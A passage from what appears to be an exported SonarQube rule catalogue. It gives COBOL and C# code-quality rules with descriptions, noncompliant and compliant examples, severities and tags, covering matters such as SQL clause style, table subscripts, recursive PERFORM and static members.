  <li> Phrases: <code>REVERSED</code> phrase of the <code>OPEN</code> statement </li>
  <li> Special registers: <code>DEBUG-ITEM</code> </li>
  <li> Sections: Debugging sections </li>
  <li> Declarative: <code>USE FOR DEBUGGING</code> </li>
</ul>
<p>The following keywords were declared obsolete in the ISO/IEC 1989:2002 standard:</p>
<ul>
  <li> Phrase: <code>DEBUGGING MODE</code> </li>
  <li> Clause: <code>PADDING CHARACTER</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
IDENTIFICATION DIVISION.
PROGRAM-ID.  AcceptAndDisplay.
AUTHOR.  Michael Coughlan.  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
IDENTIFICATION DIVISION.
PROGRAM-ID.  AcceptAndDisplay.
</pre>",Obsolete keywords should not be used,[],MINOR,['obsolete'],CODE_SMELL
2016-12-09T10:13:20+0100,"<p>In general, the clause <code>INDEXED BY</code> should be used whenever possible when handling COBOL tables. If it's not possible, then avoid using
a numeric display variable to access the table's elements. Instead, use a <code>BINARY</code>/<code>COMP</code> variable, which the processor can
handle more efficiently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       01 SUBS PIC 9(5).
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES.
       ...
       PERFORM VARYING SUBS FROM 1 BY 1 UNTIL SUBS &gt; 10000
         MOVE ITEM1 TO Field-A (SUBS)      *&gt; Noncompliant
       END-PERFORM.
</pre>
<h2>Compliant Solution</h2>
<pre>
       01 SUBS PIC 9(5) COMP.
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES.
       ...
       PERFORM VARYING SUBS FROM 1 BY 1 UNTIL SUBS &gt; 10000
         MOVE ITEM1 TO Field-A (SUBS)
       END-PERFORM.
</pre>
<p>or </p>
<pre>
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES INDEXED BY IDX1.
       ...
       PERFORM VARYING IDX1 FROM 1 BY 1 UNTIL IDX1 &gt; 10000
         MOVE ITEM1 TO Field-A (IDX1)
       END-PERFORM.
</pre>",cobol:S3632,cobol,COBOL,"<p>In general, the clause <code>INDEXED BY</code> should be used whenever possible when handling COBOL tables. If it's not possible, then avoid using
a numeric display variable to access the table's elements. Instead, use a <code>BINARY</code>/<code>COMP</code> variable, which the processor can
handle more efficiently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       01 SUBS PIC 9(5).
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES.
       ...
       PERFORM VARYING SUBS FROM 1 BY 1 UNTIL SUBS &gt; 10000
         MOVE ITEM1 TO Field-A (SUBS)      *&gt; Noncompliant
       END-PERFORM.
</pre>
<h2>Compliant Solution</h2>
<pre>
       01 SUBS PIC 9(5) COMP.
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES.
       ...
       PERFORM VARYING SUBS FROM 1 BY 1 UNTIL SUBS &gt; 10000
         MOVE ITEM1 TO Field-A (SUBS)
       END-PERFORM.
</pre>
<p>or </p>
<pre>
       01 INVENTORY-RECORD.
          05 Field-A PIC X OCCURS 10000 TIMES INDEXED BY IDX1.
       ...
       PERFORM VARYING IDX1 FROM 1 BY 1 UNTIL IDX1 &gt; 10000
         MOVE ITEM1 TO Field-A (IDX1)
       END-PERFORM.
</pre>",Binary variables should be used for table subscript access,[],MAJOR,['performance'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>TYPEDEF</code> keyword creates new user-defined data types. It should only be used in copybooks, which can be shared among programs, not
in the programs themselves.</p>",cobol:COBOL.TypedefUsageCheck,cobol,COBOL,"<p>The <code>TYPEDEF</code> keyword creates new user-defined data types. It should only be used in copybooks, which can be shared among programs, not
in the programs themselves.</p>",New types should be defined in copybooks,[],MAJOR,['bad-practice'],CODE_SMELL
2014-07-25T08:22:45+0200,"<p>Programs that depend on a lot of different subprograms tend to aggregate too many responsibilities, and inevitably become harder to understand and
therefore to maintain. Above a specific threshold, it is strongly advised to refactor the program into several smaller programs which focus on
well-defined topics.</p>",cobol:S1693,cobol,COBOL,"<p>Programs that depend on a lot of different subprograms tend to aggregate too many responsibilities, and inevitably become harder to understand and
therefore to maintain. Above a specific threshold, it is strongly advised to refactor the program into several smaller programs which focus on
well-defined topics.</p>",The number of subprograms called in a program should be limited,"[{'key': 'threshold', 'htmlDesc': 'Maximum number of different subprograms called in a program', 'defaultValue': '50', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS 'US'
</pre>
<h2>Exceptions</h2>
<p>Not having a WHERE clause is acceptable in read-only cursors as results are generally sorted and it is possible to stop processing in the
middle.</p>",cobol:SQL.SelectWithNoWhereClauseCheck,cobol,COBOL,"<p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS 'US'
</pre>
<h2>Exceptions</h2>
<p>Not having a WHERE clause is acceptable in read-only cursors as results are generally sorted and it is possible to stop processing in the
middle.</p>","SQL ""SELECT"" statements should have ""WHERE"" conditions",[],BLOCKER,"['performance', 'sql']",VULNERABILITY
2014-06-06T08:18:23+0200,"<p>COBOL files containing a large number of paragraphs are by definition difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>Paragraphs contained in copybooks are ignored when computing the total number of paragraphs in a program.</p>",cobol:S1692,cobol,COBOL,"<p>COBOL files containing a large number of paragraphs are by definition difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>Paragraphs contained in copybooks are ignored when computing the total number of paragraphs in a program.</p>",Files should not contain too many paragraphs,"[{'key': 'threshold', 'htmlDesc': 'The maximum authorized paragraphs.', 'defaultValue': '100', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-06-06T08:18:23+0200,"<p>Programs that include a lot of copybooks tend to aggregate too many responsibilities and inevitably become harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor the program into smaller ones which focus on well-defined topics.</p>",cobol:S1691,cobol,COBOL,"<p>Programs that include a lot of copybooks tend to aggregate too many responsibilities and inevitably become harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor the program into smaller ones which focus on well-defined topics.</p>",The number of COPY directives in a program should be limited,"[{'key': 'threshold', 'htmlDesc': 'The maximum authorized COPY directives', 'defaultValue': '50', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2016-05-06T09:20:29+0200,"<p>The binary algorithm used by <code>SEARCH ALL</code> is far more efficient for large tables than the one used by <code>SEARCH</code>. While it's
not always possible to use <code>SEARCH ALL</code>, it should be the preferred algorithm.</p>
<p>This rule raises an issue when tables with more than the specified number of possible entries are searched using <code>SEARCH</code>.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default threshold of 500:</p>
<pre>
01  MY-TABLE.
05 MY-TAB-ELEM OCCURS 300000
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB2.
05 MY-TAB2-ELEM          OCCURS 300000
     ASCENDING MY-ATTR1  *&gt; Key is defined. Why not use it?
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB-IND             PIC 9(08).


SEARCH MY-TAB-ELEM.  *&gt; Noncompliant; define a key &amp; use binary search
       AT END...

SEARCH MY-TAB2-ELEM.  *&gt; Noncompliant
       AT END...
</pre>
<h2>Compliant Solution</h2>
<pre>
01  MY-TABLE.
05 MY-TAB-ELEM OCCURS 300000
     ASCENDING MY-ATTR1
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB2.
05 MY-TAB2-ELEM          OCCURS 300000
     ASCENDING MY-ATTR1
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB-IND             PIC 9(08).


SEARCH ALL MY-TAB-ELEM.
       AT END...

SEARCH ALL MY-TAB2-ELEM.
       AT END...
</pre>",cobol:S3595,cobol,COBOL,"<p>The binary algorithm used by <code>SEARCH ALL</code> is far more efficient for large tables than the one used by <code>SEARCH</code>. While it's
not always possible to use <code>SEARCH ALL</code>, it should be the preferred algorithm.</p>
<p>This rule raises an issue when tables with more than the specified number of possible entries are searched using <code>SEARCH</code>.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default threshold of 500:</p>
<pre>
01  MY-TABLE.
05 MY-TAB-ELEM OCCURS 300000
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB2.
05 MY-TAB2-ELEM          OCCURS 300000
     ASCENDING MY-ATTR1  *&gt; Key is defined. Why not use it?
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB-IND             PIC 9(08).


SEARCH MY-TAB-ELEM.  *&gt; Noncompliant; define a key &amp; use binary search
       AT END...

SEARCH MY-TAB2-ELEM.  *&gt; Noncompliant
       AT END...
</pre>
<h2>Compliant Solution</h2>
<pre>
01  MY-TABLE.
05 MY-TAB-ELEM OCCURS 300000
     ASCENDING MY-ATTR1
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB2.
05 MY-TAB2-ELEM          OCCURS 300000
     ASCENDING MY-ATTR1
     INDEXED BY MY-TAB-IND.
  10 MY-ATTR1                        PIC X(07).
  10 MY-ATTR2                        PIC X(07).
  10 MY-ATTR3                        PIC X(07).

01  MY-TAB-IND             PIC 9(08).


SEARCH ALL MY-TAB-ELEM.
       AT END...

SEARCH ALL MY-TAB2-ELEM.
       AT END...
</pre>",Binary search should be used for large tables,"[{'key': 'threshold', 'htmlDesc': 'Minimum table size to require the use of binary searches', 'defaultValue': '500', 'type': 'INTEGER'}]",MINOR,['performance'],CODE_SMELL
2014-07-25T08:22:45+0200,"<p>The main motivation for this rule is to improve the readability of relevant SQL code. From one database optimiser to another, the performance of
<code>IN</code> and <code>OR</code> clauses to specify a list of possible values for a column can be slightly different, but this difference is
usually very minor. What is not minor is the difference in readability between the two styles, which is why an <code>IN</code> clause is preferred.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE = 10 OR AGE = 13 OR AGE = 18 OR AGE &lt; 5
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE IN (10, 13, 18) OR AGE &lt; 5
</pre>",cobol:S1738,cobol,COBOL,"<p>The main motivation for this rule is to improve the readability of relevant SQL code. From one database optimiser to another, the performance of
<code>IN</code> and <code>OR</code> clauses to specify a list of possible values for a column can be slightly different, but this difference is
usually very minor. What is not minor is the difference in readability between the two styles, which is why an <code>IN</code> clause is preferred.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE = 10 OR AGE = 13 OR AGE = 18 OR AGE &lt; 5
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE IN (10, 13, 18) OR AGE &lt; 5
</pre>","SQL ""OR"" clauses testing equality on the same identifier should be replaced by an ""IN"" clause",[],MAJOR,"['convention', 'sql']",CODE_SMELL
2014-07-25T08:22:45+0200,"<p>When the value of a <code>LIKE</code> clause starts with '%' or '_', indexes on the searched column are ignored, and a full table scan is performed
instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME FROM PERSONS
WHERE LAST_NAME LIKE '%PONT'
</pre>",cobol:S1739,cobol,COBOL,"<p>When the value of a <code>LIKE</code> clause starts with '%' or '_', indexes on the searched column are ignored, and a full table scan is performed
instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME FROM PERSONS
WHERE LAST_NAME LIKE '%PONT'
</pre>","SQL ""LIKE"" clauses should not start with wildcard characters",[],MAJOR,"['performance', 'sql']",CODE_SMELL
2014-07-25T08:22:45+0200,"<p>According to SQL-92: </p>
<blockquote>
  <p> </p>
  <p>""X BETWEEN Y AND Z"" is equivalent to ""X&gt;=Y AND X&lt;=Z"" </p>
  <p></p>
</blockquote>
<p></p>
<p>Even if the <code>BETWEEN</code> predicate is simply syntactic sugar, using it can improve the readability of a SQL WHERE clause, and is therefore
preferred. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE &gt;=18 and AGE &lt;=60
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE BETWEEN 18 and 60
</pre>",cobol:S1737,cobol,COBOL,"<p>According to SQL-92: </p>
<blockquote>
  <p> </p>
  <p>""X BETWEEN Y AND Z"" is equivalent to ""X&gt;=Y AND X&lt;=Z"" </p>
  <p></p>
</blockquote>
<p></p>
<p>Even if the <code>BETWEEN</code> predicate is simply syntactic sugar, using it can improve the readability of a SQL WHERE clause, and is therefore
preferred. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE &gt;=18 and AGE &lt;=60
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM PERSONS
WHERE AGE BETWEEN 18 and 60
</pre>","A SQL ""BETWEEN"" clause should be used instead of ""X>=Y AND X<=Z""",[],MAJOR,"['convention', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The number of distinct data items used in a condition (<code>IF</code>, <code>EVALUATE</code>, ...) should not exceed a defined threshold.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default default threshold of 3:</p>
<pre>
IF WS-FOO(1) = 1 OR *&gt; 1st data item
WS-FOO(2) = 2 OR
WS-FOO(3) = 3 OR
WS-BAR = 4 OR *&gt; 2nd data item
WS-BAZ = 5 OR *&gt; 3rd data item
WS-QUX = 42 *&gt; Noncompliant; 4th data item
END-IF.
</pre>
<h2>Compliant Solution</h2>
<pre>
IF WS-FOO(1) = 1 OR
WS-FOO(2) = 2 OR
WS-FOO(3) = 3 OR
WS-BAR = 4 OR
WS-BAZ = 42
END-IF.
</pre>",cobol:COBOL.ConditionComplexityCheck,cobol,COBOL,"<p>The number of distinct data items used in a condition (<code>IF</code>, <code>EVALUATE</code>, ...) should not exceed a defined threshold.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default default threshold of 3:</p>
<pre>
IF WS-FOO(1) = 1 OR *&gt; 1st data item
WS-FOO(2) = 2 OR
WS-FOO(3) = 3 OR
WS-BAR = 4 OR *&gt; 2nd data item
WS-BAZ = 5 OR *&gt; 3rd data item
WS-QUX = 42 *&gt; Noncompliant; 4th data item
END-IF.
</pre>
<h2>Compliant Solution</h2>
<pre>
IF WS-FOO(1) = 1 OR
WS-FOO(2) = 2 OR
WS-FOO(3) = 3 OR
WS-BAR = 4 OR
WS-BAZ = 42
END-IF.
</pre>",Conditions should not use too many distinct data items,"[{'key': 'maximumNumberOfOperands', 'htmlDesc': 'Maximal number of distinct operands allowed in conditions', 'defaultValue': '3', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-07-25T08:22:45+0200,"<p>Even though the <code>ORDER BY</code> clause supports using column numbers, doing so makes the code difficult to read and maintain. Therefore the
use of column names is preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME, REGION
FROM PERSONS
ORDER BY 2, 1
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME, REGION
FROM PERSONS
ORDER BY LAST_NAME, FIRST_NAME
</pre>",cobol:S1735,cobol,COBOL,"<p>Even though the <code>ORDER BY</code> clause supports using column numbers, doing so makes the code difficult to read and maintain. Therefore the
use of column names is preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME, REGION
FROM PERSONS
ORDER BY 2, 1
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT FIRST_NAME, LAST_NAME, REGION
FROM PERSONS
ORDER BY LAST_NAME, FIRST_NAME
</pre>","Column names should be used in a SQL ""ORDER BY"" clause",[],MAJOR,['sql'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Unless direct calls to paragraphs are forbidden, using <code>PERFORM section1</code> is usually error prone. Indeed, in that case, when creating a
new paragraph in the middle of an existing source code there is no easy way to know if an existing execution flow can go through this new
paragraph.</p>",cobol:COBOL.PerformThruSectionMandatoryCheck,cobol,COBOL,"<p>Unless direct calls to paragraphs are forbidden, using <code>PERFORM section1</code> is usually error prone. Indeed, in that case, when creating a
new paragraph in the middle of an existing source code there is no easy way to know if an existing execution flow can go through this new
paragraph.</p>","""PERFORM SECTION"" should not be used","[{'key': 'exclusionList', 'htmlDesc': 'Comma separated list of sections that can be called with the &quot;PERFORM&quot; procedure statement', 'type': 'STRING'}]",MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,<p>You should avoid keeping in programs files that are declared but never used. This is visual pollution and makes the program less readable.</p>,cobol:COBOL.FileUnusedCheck,cobol,COBOL,<p>You should avoid keeping in programs files that are declared but never used. This is visual pollution and makes the program less readable.</p>,Declared files should be used,[],MAJOR,['unused'],CODE_SMELL
2014-06-06T08:18:23+0200,"<p>Explicitly defining a cursor as read-only can improve performance by avoiding table locking. This allows other SQL requests to execute in parallel.
Therefore when a cursor will only be used to read data, without modifying anything, the <code>FOR READ ONLY</code> clause or its synonyn, <code>FOR
FETCH ONLY</code>, should be used.</p>
<p>Conversely when a cursor will modify data, that too should be specified using the <code>FOR UPDATE</code> clause. </p>
<p>In short, it's better to always explicitly define the purpose of the cursor with help of the <code>FOR READ ONLY</code>, <code>FOR FETCH
ONLY</code> or <code>FOR UPDATE</code> clauses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EXEC SQL DECLARE CMAJ_0A CURSOR
  FOR SELECT C_BQ
    FROM       S1ORDCOU
    WHERE C_BQ = :TORD-C-BQ
END-EXEC
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL DECLARE CMAJ_0A CURSOR
  FOR SELECT C_BQ
    FROM       S1ORDCOU
    WHERE C_BQ = :TORD-C-BQ
  FOR READ ONLY
END-EXEC
</pre>",cobol:S1732,cobol,COBOL,"<p>Explicitly defining a cursor as read-only can improve performance by avoiding table locking. This allows other SQL requests to execute in parallel.
Therefore when a cursor will only be used to read data, without modifying anything, the <code>FOR READ ONLY</code> clause or its synonyn, <code>FOR
FETCH ONLY</code>, should be used.</p>
<p>Conversely when a cursor will modify data, that too should be specified using the <code>FOR UPDATE</code> clause. </p>
<p>In short, it's better to always explicitly define the purpose of the cursor with help of the <code>FOR READ ONLY</code>, <code>FOR FETCH
ONLY</code> or <code>FOR UPDATE</code> clauses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EXEC SQL DECLARE CMAJ_0A CURSOR
  FOR SELECT C_BQ
    FROM       S1ORDCOU
    WHERE C_BQ = :TORD-C-BQ
END-EXEC
</pre>
<h2>Compliant Solution</h2>
<pre>
EXEC SQL DECLARE CMAJ_0A CURSOR
  FOR SELECT C_BQ
    FROM       S1ORDCOU
    WHERE C_BQ = :TORD-C-BQ
  FOR READ ONLY
END-EXEC
</pre>","""FOR READ ONLY"" or ""FOR UPDATE"" should be specified for DB2 cursors",[],MAJOR,"['performance', 'sql']",CODE_SMELL
2019-03-13T09:11:18+0100,"<p>88-level variables, also known as ""condition name"" variables, represent possible values of the ""conditional variables"" they're tied to. An unused
""condition name"" variable is dead code. Such variables should be removed to increase the maintainability of the program.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 COLOR PIC X.
  88 COL-YELLOW VALUE 'Y'.
  88 COL-GREEN VALUE 'G'. *&gt; Noncompliant; not used
  88 COL-RED VALUE 'R'.

* ...
IF COL-YELLOW
* ...
END-IF
IF COL-RED
* ...
END-IF
</pre>
<h2>Compliant Solution</h2>
<pre>
01 COLOR PIC X.
  88 COL-YELLOW VALUE 'Y'.
  88 COL-RED VALUE 'R'.

* ...
IF COL-YELLOW
* ...
END-IF
IF COL-RED
* ...
END-IF
</pre>",cobol:S4727,cobol,COBOL,"<p>88-level variables, also known as ""condition name"" variables, represent possible values of the ""conditional variables"" they're tied to. An unused
""condition name"" variable is dead code. Such variables should be removed to increase the maintainability of the program.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01 COLOR PIC X.
  88 COL-YELLOW VALUE 'Y'.
  88 COL-GREEN VALUE 'G'. *&gt; Noncompliant; not used
  88 COL-RED VALUE 'R'.

* ...
IF COL-YELLOW
* ...
END-IF
IF COL-RED
* ...
END-IF
</pre>
<h2>Compliant Solution</h2>
<pre>
01 COLOR PIC X.
  88 COL-YELLOW VALUE 'Y'.
  88 COL-RED VALUE 'R'.

* ...
IF COL-YELLOW
* ...
END-IF
IF COL-RED
* ...
END-IF
</pre>",Unused condition names should be removed,[],MAJOR,['unused'],CODE_SMELL
2016-02-15T16:42:06+0100,"<p>Updating the value of a column that is part of a partitioning index could force the database to move a row from one partition to another. The move
operation itself might be costly, but even worse without regularly updating the DB statistics, many updates like this might impact the performance of
subsequent SQL requests that use the partitioning index.</p>
<p><strong>Note</strong> This rule raises issues only when a database catalog is provided during the SonarQube analysis.</p>",cobol:S3515,cobol,COBOL,"<p>Updating the value of a column that is part of a partitioning index could force the database to move a row from one partition to another. The move
operation itself might be costly, but even worse without regularly updating the DB statistics, many updates like this might impact the performance of
subsequent SQL requests that use the partitioning index.</p>
<p><strong>Note</strong> This rule raises issues only when a database catalog is provided during the SonarQube analysis.</p>","SQL ""UPDATE"" statements should not impact columns included in partitioning indexes",[],MINOR,"['performance', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Most COBOL environments do not support recursive <code>PERFORM</code> calls, since they can cause unpredictable results. This rule raises an issue
when recursive <code>PERFORM</code> calls are used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
PARAGRAPH1.
  PERFORM PARAGRAPH2.

PARAGRAPH2.
  PERFORM PARAGRAPH3.

PARAGRAPH3.
  PERFORM PARAGRAPH1.
</pre>
<h2>Compliant Solution</h2>
<pre>
PARAGRAPH1.
  PERFORM PARAGRAPH2.

PARAGRAPH2.
  PERFORM PARAGRAPH3.

PARAGRAPH3.
  DISPLAY ""THIS IS PARAGRAPH3"".
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.2 - Functions shall not call themselves, either directly or indirectly. </li>
  <li> MISRA C++:2008, 7-5-4 - Functions should not call themselves, either directly or indirectly. </li>
  <li> MISRA C:2012, 17.2 - Functions shall not call themselves, either directly or indirectly </li>
</ul>",cobol:COBOL.RecursivePerformCheck,cobol,COBOL,"<p>Most COBOL environments do not support recursive <code>PERFORM</code> calls, since they can cause unpredictable results. This rule raises an issue
when recursive <code>PERFORM</code> calls are used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
PARAGRAPH1.
  PERFORM PARAGRAPH2.

PARAGRAPH2.
  PERFORM PARAGRAPH3.

PARAGRAPH3.
  PERFORM PARAGRAPH1.
</pre>
<h2>Compliant Solution</h2>
<pre>
PARAGRAPH1.
  PERFORM PARAGRAPH2.

PARAGRAPH2.
  PERFORM PARAGRAPH3.

PARAGRAPH3.
  DISPLAY ""THIS IS PARAGRAPH3"".
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.2 - Functions shall not call themselves, either directly or indirectly. </li>
  <li> MISRA C++:2008, 7-5-4 - Functions should not call themselves, either directly or indirectly. </li>
  <li> MISRA C:2012, 17.2 - Functions shall not call themselves, either directly or indirectly </li>
</ul>","""PERFORM"" calls should not be recursive",[],CRITICAL,"['bad-practice', 'misra', 'pitfall', 'unpredictable']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>It is a bad practice to declare a cursor inside a procedure division, so you should avoid it.</p>",cobol:SQL.CursorDeclaredInsideProcedureDivisionCheck,cobol,COBOL,"<p>It is a bad practice to declare a cursor inside a procedure division, so you should avoid it.</p>","""CURSORs"" should not be declared inside procedure divisions",[],MINOR,['sql'],CODE_SMELL
2016-05-25T15:32:27+0200,"<p>There's no point in checking a variable against the value you're about to assign it. Save the cycles and lines of code, and simply perform the
assignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != a)  // Noncompliant; why bother?
{
    x = a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a;
</pre>
<h2>Exceptions</h2>
<p>Properties and checks inside setters are excluded from this rule because they could have side effects and removing the check could lead to
undesired side effects.</p>
<pre>
if (MyProperty != a)
{
    MyProperty = a; // Compliant because the setter could be expensive call
}
</pre>
<pre>
private int myField;
public int SomeProperty
{
    get
    {
        return myField;
    }
    set
    {
        if (myField != value)
        {
            myField = value;
        }
    }
}
</pre>",csharpsquid:S3440,cs,C#,"<p>There's no point in checking a variable against the value you're about to assign it. Save the cycles and lines of code, and simply perform the
assignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != a)  // Noncompliant; why bother?
{
    x = a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a;
</pre>
<h2>Exceptions</h2>
<p>Properties and checks inside setters are excluded from this rule because they could have side effects and removing the check could lead to
undesired side effects.</p>
<pre>
if (MyProperty != a)
{
    MyProperty = a; // Compliant because the setter could be expensive call
}
</pre>
<pre>
private int myField;
public int SomeProperty
{
    get
    {
        return myField;
    }
    set
    {
        if (myField != value)
        {
            myField = value;
        }
    }
}
</pre>",Variables should not be checked against the values they're about to be assigned,[],MINOR,['confusing'],CODE_SMELL
2015-07-27T14:14:23+0200,"<p>Methods and properties that don't access instance data can be <code>static</code> to prevent any misunderstanding about the contract of the method.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Utilities
{
    public int MagicNum // Noncompliant
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = ""please"";
    public string MagicWord  // Noncompliant
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
  }

    public int Sum(int a, int b)  // Noncompliant
    {
        return a + b;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Utilities
{
    public static int MagicNum
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = ""please"";
    public static string MagicWord
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
    }

    public static int Sum(int a, int b)
    {
        return a + b;
    }
}
</pre>
<h2>Exceptions</h2>
<p>Methods with the following names are excluded because they can't be made <code>static</code>:</p>
<ul>
  <li> Application_AuthenticateRequest </li>
  <li> Application_BeginRequest </li>
  <li> Application_End </li>
  <li> Application_EndRequest </li>
  <li> Application_Error </li>
  <li> Application_Init </li>
  <li> Application_Start </li>
  <li> Session_End </li>
  <li> Session_Start </li>
</ul>",csharpsquid:S2325,cs,C#,"<p>Methods and properties that don't access instance data can be <code>static</code> to prevent any misunderstanding about the contract of the method.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Utilities
{
    public int MagicNum // Noncompliant
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = ""please"";
    public string MagicWord  // Noncompliant
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
  }

    public int Sum(int a, int b)  // Noncompliant
    {
        return a + b;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Utilities
{
    public static int MagicNum
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = ""please"";
    public static string MagicWord
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
    }

    public static int Sum(int a, int b)
    {
        return a + b;
    }
}
</pre>
<h2>Exceptions</h2>
<p>Methods with the following names are excluded because they can't be made <code>static</code>:</p>
<ul>
  <li> Application_AuthenticateRequest </li>
  <li> Application_BeginRequest </li>
  <li> Application_End </li>
  <li> Application_EndRequest </li>
  <li> Application_Error </li>
  <li> Application_Init </li>
  <li> Application_Start </li>
  <li> Session_End </li>
  <li> Session_Start </li>
</ul>",Methods and properties that don't access instance data should be static,[],MINOR,['pitfall'],CODE_SMELL
2015-07-27T14:14:23+0200,"<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int Example(int i)
{
    return (int) (i + 42); // Noncompliant
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse().OfType&lt;int&gt;(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int Example(int i)
{
    return i + 42;
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse();
}
</pre>
<h2>Exceptions</h2>
<p>Issues are not raised against C# 7.1 `default` literal.</p>
<pre>
bool b = (bool)default; // Doesn't raise an issue
